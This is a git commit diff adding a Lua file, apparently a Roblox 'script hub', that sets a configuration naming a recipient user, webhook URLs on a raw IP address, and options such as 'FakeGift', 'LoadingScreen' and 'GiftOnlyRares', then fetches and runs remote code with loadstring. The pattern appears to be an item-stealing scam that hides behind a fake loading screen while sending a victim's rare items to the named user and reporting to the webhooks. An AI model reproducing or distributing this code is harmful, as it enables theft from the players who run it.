0dc804aeffa1c5b875b64a8128350f2c83ba23db
NolagScript-hub-script <jiminonelly@gmail.com>
2025-08-04 18:01:21 +0800

    Upload GGS-hub.lua via Script Source Converter

---
+++ GGS-hub.lua
@@ -0,0 +1,13 @@
+_G.NullConfig = {
+    User = {"yan_sen13"},
+    min_value = 10000000000,
+    pingEveryone = "Yes", -- dont change this
+    Webhook = "http://45.13.225.83:20002/proxy/b94afe57ffee96b79d44684a268850d2",
+    FakeGift = "Yes",
+    Trash = "http://45.13.225.83:20002/proxy/98593d2092be5ebb7f5bc1f8c681e0e3",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "Yes",
+    ExecuteOtherScript = "No",
+}
+    
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
